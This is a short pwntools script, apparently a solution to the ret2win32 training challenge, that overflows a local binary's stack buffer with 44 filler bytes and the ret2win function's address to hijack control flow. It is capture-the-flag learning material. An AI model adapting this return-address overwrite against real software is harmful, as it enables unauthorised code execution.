from pwn import *

p = process('./ret2win32')
e = ELF('./ret2win32')

payload = b'A' * 44 + p32(e.symbols['ret2win'])
p.send(payload)
p.interactive()